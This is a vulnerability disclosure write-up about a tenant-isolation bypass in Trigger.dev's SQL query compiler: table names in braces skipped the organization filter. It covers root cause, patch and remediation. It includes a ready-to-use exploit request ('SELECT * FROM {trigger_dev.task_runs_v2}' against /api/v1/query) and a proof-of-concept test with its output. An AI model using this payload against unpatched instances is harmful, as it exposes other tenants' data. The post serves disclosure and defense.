---
title: "Curly Braces Around a Table Name Skipped Trigger.dev's Tenant Filter"
description: "Trigger.dev runs background jobs and AI agents for more than 30,000 developers. Its query API adds an organization filter to each table, but a table name in {braces} skipped it, so any API key could read the rows of all tenants. The fix shipped in 4.7.3, one day after my report."
date: "2026-10-08"
tags: ["trigger-dev", "multi-tenant", "sql-injection", "cwe-863", "clickhouse", "web-security"]
---

Trigger.dev runs background jobs and AI agents for more than 30,000 developers. Its SDK gets about 1.3 million npm downloads each week. Trigger.dev also lets you query your run data with SQL. You send the query to `POST /api/v1/query`. A compiler translates it to ClickHouse SQL and adds a filter to each table. The filter limits the rows to your organization, project, and environment.

In v4.7.2, one table syntax skipped that filter:

```sql
SELECT * FROM {trigger_dev.task_runs_v2}
```

The braces sent the table into a different branch of the compiler. That branch did not add the tenant filter, and it did not check the table allowlist. It printed the table name as you wrote it, and ClickHouse ran the query. An environment API key or a public JWT was enough. With that credential, you could read the run payloads and metadata of all organizations, plus other tables that the query connection can read.

I reported it on 2026-10-05. Trigger.dev fixed it the next day, released 4.7.3, and published GHSA-m79r-84cc-xwg9. They say nobody exploited it on their cloud.

This is the second cross-tenant bug in this compiler. The first one had a different cause but the same result.

## Who runs on Trigger.dev

Y Combinator backed Trigger.dev early. Standard Capital led its $16M Series A in December 2025. In that announcement, the company said more than 30,000 developers use the platform. It said they run hundreds of millions of agents each month. MagicSchool uses it for AI teaching assistants, Icon.com for AI adverts, and DavidAI for AI audio datasets.

| Metric | Value | Source |
|---|---|---|
| Developers | More than 30,000 | Trigger.dev, Dec 2025 |
| Agent runs | Hundreds of millions per month | Trigger.dev, Dec 2025 |
| Funding | $16M Series A, led by Standard Capital | Trigger.dev, Dec 2025 |
| `@trigger.dev/sdk` downloads | 1,295,956 (week of 2026-09-28) | npm |
| `@trigger.dev/sdk` downloads | 4,189,121 (last 30 days) | npm |
| GitHub | 16,502 stars, 146 contributors | GitHub API, 2026-10-08 |

On the cloud, the run data of all those teams sits in one ClickHouse cluster. The filter that this bug skipped was the wall between them. The Free plan costs $0 and gives you an API key. So the price of a cross-tenant read was one sign-up.

Two caveats, so I don't oversell it. Download counts measure SDK installs, not exposed servers. And Trigger.dev says nobody exploited the bug on their cloud.

## How the query API keeps tenants apart

Trigger.dev is a platform for background jobs. Your tasks run on their infrastructure, and the runs, events, logs, and metrics go into ClickHouse. All customers share one ClickHouse cluster, so the code must keep the data of each organization apart.

The compiler in `internal-packages/tsql/src/query/printer.ts` does this with two controls:

1. **An allowlist.** You can query only the tables that the compiler knows.
2. **An enforced filter.** The compiler adds `organization_id = <yours> AND project_id = <yours> AND environment_id = <yours>` to each table. The webapp takes these values from your credential, and your query cannot change them.

The webapp runs the compiled query with `readonly=1`. Both controls are correct. One branch of the compiler did not call them.

## The placeholder branch had no guard

The function `visitJoinExpr` resolves the table in a `FROM` or `JOIN` clause. It has one branch for each type of table expression. This is the code at v4.7.2:

```typescript
if ((tableExpr as Field).expression_type === "field") {
  const tableSchema = this.lookupTable(tableName);                  // allowlist
  this.validateRequiredTenantColumns(tableSchema);
  extraWhere = this.createEnforcedGuard(tableSchema, effectiveAlias); // tenant filter
} else if ((tableExpr as Placeholder).expression_type === "placeholder") {
  // Placeholder - visit inner expression
  joinStrings.push(this.visit(tableExpr));                          // nothing
}
```

A normal table name is a `field`. That branch calls `lookupTable` (the allowlist) and `createEnforcedGuard` (the tenant filter).

A table name in braces is a `placeholder`. The grammar accepts it in table position (`TSQLParser.g4`, `placeholder # TableExprPlaceholder`). That branch calls `this.visit(tableExpr)` and nothing else. The variable `extraWhere` stays `null`, so the compiler adds no filter.

Next, `visitPlaceholder` visits the expression inside the braces. That expression is a field that holds the name you typed. The compiler has no table with that name. So `resolveFieldChain` falls into its "not a known table alias, return as-is" branch and prints the name without change.

The grammar has the `{placeholder}` syntax, but no code in the repo replaces a placeholder with a value. I checked with grep. The syntax had no use. Its one effect was to skip the guard.

The route has a second check, `detectQueryTables`, which lists the tables in a query. That function ignored placeholder tables too. So neither check saw the table.

## The exploit

**Step 1: Get a credential that the query endpoint accepts.** An environment API key or a public JWT is sufficient. Customers put these low-privilege credentials into their own apps.

**Step 2: Put the table name in braces.**

```text
POST /api/v1/query HTTP/1.1
Authorization: Bearer <any environment API key or public JWT>
Content-Type: application/json

{"query": "SELECT * FROM {trigger_dev.task_runs_v2} LIMIT 100"}
```

**Step 3: Read the rows of all tenants.**

## Proving it

I tested at the compiler level against release tag v4.7.2 (commit `28f424096`). I wrote a vitest file next to the repo's `security.test.ts` and copied its tenant setup. The test scopes the caller to `org_tenant1`, in the same way that `queryService.server.ts` scopes an API key. Each query goes through the real `compileTSQL`, and I did not mock the compiler.

```typescript
// internal-packages/tsql/src/query/placeholder_bypass.poc.test.ts
import { describe, expect, it } from "vitest";
import { compileTSQL, type CompileTSQLOptions } from "../index.js";
import { column, type TableSchema } from "./schema.js";

const taskRunsSchema: TableSchema = {
  name: "task_runs",
  clickhouseName: "trigger_dev.task_runs_v2",
  columns: {
    id: { name: "id", ...column("String") },
    organization_id: { name: "organization_id", ...column("String") },
    project_id: { name: "project_id", ...column("String") },
    environment_id: { name: "environment_id", ...column("String") },
    payload: { name: "payload", ...column("String") },
  },
  tenantColumns: {
    organizationId: "organization_id",
    projectId: "project_id",
    environmentId: "environment_id",
  },
};

// Caller scoped to org_tenant1, built the way the webapp builds it from an API key
const callerOptions: CompileTSQLOptions = {
  tableSchema: [taskRunsSchema],
  enforcedWhereClause: {
    organization_id: { op: "eq", value: "org_tenant1" },
    project_id: { op: "eq", value: "proj_tenant1" },
    environment_id: { op: "eq", value: "env_tenant1" },
  },
};

const compile = (q: string) => compileTSQL(q, callerOptions);

describe("PoC: FROM {placeholder} bypasses tenant guard", () => {
  it("BASELINE: a normal table reference IS tenant-guarded", () => {
    const { sql, params } = compile("SELECT * FROM task_runs");
    expect(sql).toContain("organization_id");
    expect(Object.values(params)).toContain("org_tenant1");
  });

  it("EXPLOIT: placeholder table emits NO tenant guard", () => {
    const { sql, params } = compile("SELECT * FROM {trigger_dev.task_runs_v2}");
    expect(Object.values(params)).not.toContain("org_tenant1");
    expect(sql).toContain("trigger_dev.task_runs_v2");
    expect(sql).not.toMatch(/organization_id/);
    console.log("[EXPLOIT compiled SQL]", sql, "params:", JSON.stringify(params));
  });

  it("EXPLOIT (subquery): guard only on outer table", () => {
    const { sql } = compile(
      "SELECT id FROM task_runs WHERE id IN (SELECT id FROM {trigger_dev.task_runs_v2})"
    );
    expect(sql).toContain("organization_id");
    expect(sql).toContain("trigger_dev.task_runs_v2");
    console.log("[EXPLOIT subquery compiled SQL]", sql);
  });
});
```

The baseline test is the control. A normal table gets the filter, and `org_tenant1` appears in the bound params. The two exploit tests check the opposite for the table in braces.

This is the run on v4.7.2:

```text
$ cd internal-packages/tsql
$ pnpm exec vitest run ./src/query/placeholder_bypass.poc.test.ts --disableConsoleIntercept

 RUN  v4.1.7 internal-packages/tsql

[EXPLOIT compiled SQL] SELECT * FROM trigger_dev.task_runs_v2 LIMIT 10000 params: {}
[EXPLOIT subquery compiled SQL] SELECT id FROM trigger_dev.task_runs_v2 AS task_runs WHERE and(and(equals(task_runs.organization_id, {tsql_val_0: String}), equals(task_runs.project_id, {tsql_val_1: String}), equals(task_runs.environment_id, {tsql_val_2: String})), in(id, (SELECT id FROM trigger_dev.task_runs_v2))) LIMIT 10000

 Test Files  1 passed (1)
      Tests  3 passed (3)
```

The first line shows `SELECT * FROM trigger_dev.task_runs_v2 LIMIT 10000` with `params: {}`. The compiled query has no organization filter, no project filter, and no environment filter.

The second line is easier to miss. The outer `task_runs` table gets all three equality checks, so the query looks guarded. The subquery `IN (SELECT id FROM trigger_dev.task_runs_v2)` has no filter, and it reads the rows of all tenants.

I did not run it against a live instance. I don't think it adds anything: when the compiled SQL has no tenant predicate, ClickHouse runs the query as written. The grants of the query connection are the last limit.

## The same compiler, a second time

GHSA-9q4r-4842-93vw came first. Trigger.dev published it in July and fixed it in 4.5.6. That bug was SQL injection through an unsanitized window-function name. The sink, the cause, and the fix were different from mine. The result was the same: one tenant could read the data of another tenant through `POST /api/v1/query`.

The compiler guards the shapes that it expects, for example "a table is a field". The security holds only if each way to write a table goes through a guarded shape. The grammar had a second shape for a table, and the compiler did not guard it.

If you build a SQL compiler that injects a tenant filter, check each grammar rule that can produce a table reference. Each one must go through the function that adds the filter. A grammar that you copy from another project can bring in syntax that you do not use, and your tests will not cover it.

## The fix is one line

This is commit `e9f56b8f6` ("fix(tsql): reject placeholder table expressions"):

```text
       } else if ((tableExpr as Placeholder).expression_type === "placeholder") {
-        // Placeholder - visit inner expression
-        joinStrings.push(this.visit(tableExpr));
+        throw new QueryError("Placeholder table expressions are not supported");
```

No real query uses a placeholder table, so the compiler now rejects them. I suggested this change in the report. The maintainers added four regression tests to `security.test.ts`: a direct table, a joined table, a subquery, and a CTE. My report did not include the JOIN case or the CTE case. Both are ways to put a table reference into a query, and I was glad to see them covered.

They changed the score too. I sent CVSS 7.7 with Scope Changed. They published 6.5 (Medium) with Scope Unchanged (`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`). I think their reading is reasonable, because the query connection and the data are in the same service.

## Remediation

If you self-host Trigger.dev, upgrade to **4.7.3 or later**:

```bash
docker pull ghcr.io/triggerdotdev/trigger.dev:v4.7.3
```

All releases up to and including 4.7.2 that expose `POST /api/v1/query` have the bug. The cloud version has the fix, and Trigger.dev says nobody exploited it.

If you cannot upgrade now, block `POST /api/v1/query` at your proxy until you can.

## Disclosure

| Event | Time (UTC) |
|---|---|
| Reported via GitHub private advisory | 2026-10-05 |
| Fix commit `e9f56b8f6` | 2026-10-06 08:38 |
| v4.7.3 released | 2026-10-06 11:31 |
| GHSA-m79r-84cc-xwg9 published, credit accepted | 2026-10-06 13:40 |

The time from report to published patch was less than 24 hours. Nobody has assigned a CVE yet, so cite the GHSA.

If you maintain a multi-tenant query compiler, go find the branch that skips your filter before someone else does.

## References

**Primary Source:**
- [GHSA-m79r-84cc-xwg9 - Tenant filtering bypass in query table placeholders](https://github.com/triggerdotdev/trigger.dev/security/advisories/GHSA-m79r-84cc-xwg9)

**Fix:**
- [Commit e9f56b8f6 - fix(tsql): reject placeholder table expressions](https://github.com/triggerdotdev/trigger.dev/commit/e9f56b8f6741d7218a79ea76f93511ec9cec6f00)
- [Release v4.7.3](https://github.com/triggerdotdev/trigger.dev/releases/tag/v4.7.3)
- [Diff v4.7.2...v4.7.3](https://github.com/triggerdotdev/trigger.dev/compare/v4.7.2...v4.7.3)

**Related:**
- [GHSA-9q4r-4842-93vw - Cross-tenant SQL injection in the TSQL query compiler via unsanitized window-function name](https://github.com/triggerdotdev/trigger.dev/security/advisories/GHSA-9q4r-4842-93vw)

**Weaknesses:**
- [CWE-863: Incorrect Authorization](https://cwe.mitre.org/data/definitions/863.html)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)

**Project:**
- [Trigger.dev on GitHub](https://github.com/triggerdotdev/trigger.dev)
- [Trigger.dev: Trigger.dev raises $16M Series A](https://trigger.dev/blog/series-a)
- [Trigger.dev pricing (Free plan)](https://trigger.dev/pricing)
- [npm: @trigger.dev/sdk](https://www.npmjs.com/package/@trigger.dev/sdk)
